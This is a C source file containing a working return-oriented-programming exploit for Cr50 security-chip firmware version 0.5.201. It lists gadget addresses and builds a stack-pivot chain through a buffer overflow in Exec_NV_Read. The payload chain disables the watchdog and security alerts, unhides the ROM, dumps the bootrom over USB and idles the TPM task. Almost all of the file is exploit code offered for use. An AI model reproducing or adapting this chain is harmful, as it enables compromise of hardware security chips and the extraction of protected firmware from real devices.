// FOR Cr50 RW 0.5.201
// this code builds the buffer to be loaded into the stack with the out buffer overflow in Exec_NV_Read.

#ifndef ROP___0_5_201_GADGETS
#define ROP___0_5_201_GADGETS

// GADGET DEFINITIONS
#define GADGET_MAX_POP___0_5_201 (0x47a28 | THUMB_BIT) // usage: (pop r3, r4, r5, r6, r7, r8, r9, r10, r11, pc)
#define GADGET_NORMAL_POP___0_5_201 (0x46ac6 | THUMB_BIT) // usage: (pop r3, r4, r5, r6, r7, pc)
#define GADGET_LESSER_POP___0_5_201 (0x45050 | THUMB_BIT) // usage: (pop r4, r5, r6, r7, pc)
#define GADGET_LEAST_POP___0_5_201 (0x45cf4 | THUMB_BIT) // usage: (pop r3, pc)
#define GADGET_SET_R4_R5_POP___0_5_201 (0x47d52 | THUMB_BIT) // usage: (pop r4, r5, pc)
#define GADGET_PC_POP_R4_R5_POP___0_5_201 (0x44966 | THUMB_BIT) // usage: (pop pc)
#define GADGET_R4_POP___0_5_201 (0x44a60 | THUMB_BIT) // usage: (pop r4, pc)
#define GADGET_SET_U32_INIT_POP___0_5_201 (0x461c0 | THUMB_BIT) // usage: (pop r4, r5, r6, pc)
#define GADGET_SET_U16_INIT_POP___0_5_201 (0x44ddc | THUMB_BIT) // usage: (pop r3, r4, r5, pc)

#define GADGET_MOVE_R0_TO_SP___0_5_201 (0x47f86 | THUMB_BIT) // usage: (mov r5, r0), (mov r6, r1), (mov r4, sp), (mov sp, r5), (blx r6)

#define GADGET_SET_U32_VAL___0_5_201 (0x6e772 | THUMB_BIT) // usage: (str r6, [r4, #0]), (pop r4, r5, r6, r7, pc)
#define GADGET_SET_U16_VAL___0_5_201 (0x69d60 | THUMB_BIT) // usage: (strh r3, [r4, #0]), (pop r3, r4, r5, pc)

#define GADGET_CLEAR_R0___0_5_201 (0x4e5b0 | THUMB_BIT) // usage: (movs r0, #0), (pop r3, pc)

// this is a while true loop, it will literally just do nothing and wait forever...
#define GADGET_WFI_LOOP___0_5_201 (0x56dfa | THUMB_BIT) // usage: (wfi, b 0x56dfa)

// does r0 = r4 - r0
#define GADGET_R4_MINUS_R0_SAVE_INTO_R0___0_5_201 (0x69a38 | THUMB_BIT) // usage: (subs r0, r4, r0), (pop r4, pc)

#define GADGET_SET_LR___0_5_201 (0x53d06 | THUMB_BIT) // usage: (pop r4, lr), (bx r3)
#define GADGET_MOVE_R4_INT0_R2___0_5_201 (0x501bc | THUMB_BIT) // usage: (mov r2, r4), (blx r7)
#define GADGET_MOVE_R4_INTO_R0___0_5_201 (0x51d1c | THUMB_BIT) // usage: (mov r0, r4), (pop r3, r4, r5, pc)
#define GADGET_MOVE_R7_INTO_R1___0_5_201 (0x497fc | THUMB_BIT) // usage: (mov r1, r7), (pop r4, r5, r6, r7, r8, pc)

#define GADGET_MOVE_R1_INTO_R4___0_5_201 (0x50dd8 | THUMB_BIT) // usage: (mov r4, r1), (blx r3)

#define GADGET_MOVE_R6_INTO_R0___0_5_201 (0x49818 | THUMB_BIT) // usage: (mov r0, r6), (pop r3, r4, r5, r6, r7, pc)
#define GADGET_MOVE_SP_PLUS_8_INTO_R1___0_5_201 (0x49442 | THUMB_BIT) // usage: (add r1, sp, #8), (blx r3)

#define GADGET_TASK_WAIT___0_5_201 (0x61c34 | THUMB_BIT)
/*
    usage:
    r0 = time to wait(we should use -1)

    return:
    r4, r5, r6, r7, r8, pc
*/

#define GADGET_PRINTF___0_5_201 (0x4e5ac | THUMB_BIT)
/*
    fyi: this auto resets r0 to 0.
    usage:
    r0 = channel
    r1 = format string
    r2... = arguments

    return:
    r3, pc
*/

#define STRING_PRINTF_PH_DELIMITER___0_5_201 (0x786af)
/*
    bytes: 44 61 74 61 3a 20 25 70 68 0a 00
    string representation: Data: %ph..
*/

// CUSTOM DATA REGIONS
// we can use the static RAM regions and store our own data in RAM. this gives us space to do more shit
// we start using the RAM from 0x19000, so we don't mess with other Cr50 buffers on the RAM.

#define DATA_STRUCT_HEX_BUFFER_buffer___0_5_201 0x19000
#define DATA_STRUCT_HEX_BUFFER_size___0_5_201 0x19004
/* 
struct hex_buffer_params {
	const void *buffer; // ptr to the hex array
	uint16_t size; // size of the hex array
};
*/

#endif /* ROP___0_5_201_GADGETS */

// our job here is to move the sp up by X bytes.
uint32_t init_ropchain_0_5_201[] = {
    // rmasmoke padding
    // its a u8 * 4, so one u32
    0x0,

    0x0, 0x0, // r4, r5
    // since we want to move to 0x422, and our current sp is entry + (4 * 9 u32s = 0x24), that is 0x422 + 0x24, which is 0x446
    0x446 - 0x8, // r6 (value to decrement from the SP - 8). minus 8 because some limitations
    0x0, 0x0, 0x0, // r7, r8, r9
    GADGET_SET_R4_R5_POP___0_5_201, // pc

    // sp_entry + 0x0 starts here...

    // filler pop, because the first 2 u32s after the initial pop stack area get run over by Exec_NV_Read.
    // we need to set r0 before anything, there's no other way to set it later, all the methods involve trudging over r4.
    0x0, 0x0, // r4, r5 (response_handle_buffer_size, response_parameter_buffer_size)
    GADGET_LEAST_POP___0_5_201, // pc

    // here, r6 is set to r0, and (current_sp + 8) is moved into r1
    GADGET_MOVE_R6_INTO_R0___0_5_201, // r3 (next pc)
    GADGET_MOVE_SP_PLUS_8_INTO_R1___0_5_201, // pc

    // a VERY important thing to note, the SP is saved here. this means that when we actually push the subtracted sp into R0, its still the sp here minus our difference
    // i'm embarassed to admit, but i got stuck here for hours because of this one issue :(
    
    // r0 = value to subtract
    // r1 = old sp
    // the new sp will be moved to r4, and will be subtracted from r0. r0 will then contain the new stack ptr.
    // this moves r1 into r4, and then (r0 = r4 - r0) is done. now, r0 contains the new stack ptr.
    GADGET_R4_MINUS_R0_SAVE_INTO_R0___0_5_201, // r3 (next pc)
    0x0, 0x0, 0x0,  // r4, r5, r6
    GADGET_MAX_POP___0_5_201, // r7 (entry payload gadget pc, standardize using MAX_POP)
    GADGET_MOVE_R1_INTO_R4___0_5_201, // pc

    // r0 = new stack ptr
    // r7 = entry pc
    0x0, // r4
    GADGET_MOVE_R7_INTO_R1___0_5_201, // pc

    // r0 = new stack ptr
    // r1 = entry pc
    0x0, 0x0, 0x0, 0x0, 0x0, // r4, r5, r6, r7, r8
    GADGET_MOVE_R0_TO_SP___0_5_201,

};

// the payload ROP chain. here, we will have a lot of space to do whatever we want.
uint32_t leak_data_main_ropchain_0_5_201[] = {
    0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, // r3, r4, r5, r6, r7, r8, r9, r10, r11
    GADGET_SET_U32_INIT_POP___0_5_201, // pc

    // ==== DISABLE WATCHDOG ====
    // *(uint32_t*)0x40500c00 = 0x1acce551
    GC_WATCHDOG_WDOGLOCK, 0x0, 0x1acce551, // r4, r5, r6
    GADGET_SET_U32_VAL___0_5_201, // pc

    // *(uint32_t*)0x40500008 = 0x0
    GC_WATCHDOG_WDOGCONTROL, 0x0, 0x0, 0x0, // r4, r5, r6, r7
    GADGET_SET_U32_VAL___0_5_201, // pc

    // *(uint32_t*)0x40500c00 = 0xdeaddead
    GC_WATCHDOG_WDOGLOCK, 0x0, 0xdeaddead, 0x0, // r4, r5, r6, r7
    GADGET_SET_U32_VAL___0_5_201, // pc
    
    // *(uint32_t*)0x4009405c = 0x0
    GC_GLOBALSEC_ALERT_CONTROL, 0x0, 0x0, 0x0, // r4, r5, r6, r7
    GADGET_SET_U32_VAL___0_5_201, // pc

    // ==== misc ====

    // disable HIDE_ROM
    // *(uint32_t*)0x400940d0 = 0x0
    GC_GLOBALSEC_HIDE_ROM, 0x0, 0x0, 0x0, // r4, r5, r6, r7
    GADGET_SET_U32_VAL___0_5_201, // pc

    // ==== PRINT THE BOOTROM OUT THROUGH USB(suzyq) ====

    // == set the channel argument, printf gadget does not do this for us. ==

    0x0, 0x0, 0x0, 0x0, // r4, r5, r6, r7
    GADGET_CLEAR_R0___0_5_201, // pc

    0x0, GADGET_SET_U32_INIT_POP___0_5_201, // r3, pc

    // == create our hex array struct ==

    // *(uint32_t*)0x19000 = 0x0
    DATA_STRUCT_HEX_BUFFER_buffer___0_5_201, 0x0, LEAK_DATA_ADDRESS_MAGIC, // r4, r5, r6
    GADGET_SET_U32_VAL___0_5_201, // pc

    0x0, 0x0, 0x0, 0x0, // r4, r5, r6, r7
    GADGET_SET_U16_INIT_POP___0_5_201, // pc

    // *(uint16_t*)0x19004 = size
    LEAK_DATA_SIZE_MAGIC, DATA_STRUCT_HEX_BUFFER_size___0_5_201, 0x0, // r3, r4, r5
    GADGET_SET_U16_VAL___0_5_201, // pc

    0x0, 0x0, 0x0, // r3, r4, r5
    GADGET_LESSER_POP___0_5_201, // pc

    // set r2 = 0x19000
    DATA_STRUCT_HEX_BUFFER_buffer___0_5_201, 0x0, 0x0, GADGET_LESSER_POP___0_5_201, // r4, r5, r6, r7
    GADGET_MOVE_R4_INT0_R2___0_5_201, // pc

    // == set the printf format ==
    0x0, 0x0, 0x0, STRING_PRINTF_PH_DELIMITER___0_5_201, // r4, r5, r6, r7
    GADGET_MOVE_R7_INTO_R1___0_5_201, // pc

    // call printf
    0x0, 0x0, 0x0, 0x0, 0x0, // r4, r5, r6, r7, r8
    GADGET_PRINTF___0_5_201, // pc

    // returned from printf
    0x0, // r3
    GADGET_R4_POP___0_5_201, // pc

    // ==== FORCE THE TPM TASK INTO IDLE ====
    // r4 is moved into r0
    0xFFFFFFFFu, // r4(wait delay)
    GADGET_MOVE_R4_INTO_R0___0_5_201, // pc

    GADGET_TASK_WAIT___0_5_201, 0x0, 0x0, // r3 (next pc), r4, r5
    GADGET_SET_LR___0_5_201, // pc

    // set lr
    0x0, // r4
    GADGET_WFI_LOOP___0_5_201, // lr (if the task delay ends or it somehow exited, then fallback to the wfi loop)
};